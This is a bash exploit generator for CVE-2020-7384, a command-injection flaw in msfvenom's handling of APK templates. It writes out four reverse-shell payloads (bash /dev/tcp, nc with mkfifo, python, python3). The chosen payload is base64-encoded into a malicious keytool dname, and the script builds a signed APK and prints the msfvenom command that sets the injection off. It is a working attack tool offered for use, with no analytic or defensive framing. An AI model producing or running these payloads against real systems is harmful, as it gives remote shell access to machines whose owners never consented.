#!/usr/bin/bash
# add colors for easier reading
RED='\033[1;91m' # high intensity red
NC='\033[0m' # no color
IBLUE='\033[0;94m' # high intensity blue

echo -e "${RED}CVE-2020-7384${NC}\n"

# check if default-jdk is installed (required for signing)
REQUIRED_PKG="default-jdk"
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $REQUIRED_PKG|grep "install ok installed")
if [ "" = "$PKG_OK" ]; then
  echo -e "This script requires $REQUIRED_PKG.\nPlease install $REQUIRED_PKG by running \"sudo apt install -y $REQUIRED_PKG\" before using this script."
  exit
fi

# get name of the final exploit.apk name
echo -e "Enter a name for the exploit file (Press enter for default: ${RED}shell${NC}): "
read expName
if [ -z "$expName" ]
then
	expName="shell"
fi

# add a random number to the end of the name to ensure no errors occur
# (unless the person has a bunch of <expName>[0-32767] directories).
expNameSafe=${expName}${RANDOM}

# try to grab the tun0 IP
ipAddr=$(ip -f inet addr show tun0 | awk '$1 == "inet" {print $2}' | cut -d '/' -f1)
# IP to send the shell to
echo -e "Enter the LHOST (Press enter for default: ${RED}$ipAddr${NC}): "
read lhost
if [ -z "$lhost" ]
then
	lhost="$ipAddr"
fi

# port to send the shell to
echo -e "Enter the LPORT (Press enter for default: ${RED}4444${NC}): "
read lport
if [ -z "$lport" ]
then
	lport=4444
fi


echo -e "\nSelect the payload type (press enter for default: ${RED}bash${NC}):\n1. bash\n2. nc\n3. python\n4. python3\n"

read -p "select: " -e select
case $select in  
  1|bash) pyld="/bin/bash -c \"/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1\"" ;;
  2|nc) pyld="rm /tmp/nbnvdoi; mkfifo /tmp/nbnvdoi; nc $lhost $lport 0</tmp/nbnvdoi | /bin/sh >/tmp/nbnvdoi 2>&1; rm /tmp/nbnvdoi" ;; 
  3|python) pyld="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
  4|python3) pyld="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" ;; 
  *|catchall) pyld="/bin/bash -c \"/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1\"" ;;
esac

# b64 encode payload and set malicious dname
payload_b64=$(echo $pyld | base64 -w 0)
dname="CN='|echo $payload_b64 | base64 -d | sh #"

# make a directory and enter it
mkdir $expNameSafe
cd $expNameSafe

# create an apk file
touch emptyfile > /dev/null 2>&1
zip -j $expName.apk emptyfile > /dev/null 2>&1

# Generate and sign the APK
keytool -genkey -keystore signing.keystore -alias signing.key -storepass password -keypass password -keyalg RSA -keysize 2048 -dname "$dname" > /dev/null 2>&1
jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore signing.keystore -storepass password -keypass password $expName.apk signing.key > /dev/null 2>&1

# copy the APK to the previous directory
cp $expName.apk ../

# move into the previous directory and delete the created directory
# this leaves only the APK left and not the emptyfile or signing file
cd ../
rm -rf $expNameSafe

echo -e "\nAPK created at: $(pwd)/${IBLUE}$expName.apk${NC}"

echo -e "\nTo use the exploit on the vulnerable machine, run:\nmsfvenom -x $expName.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null"
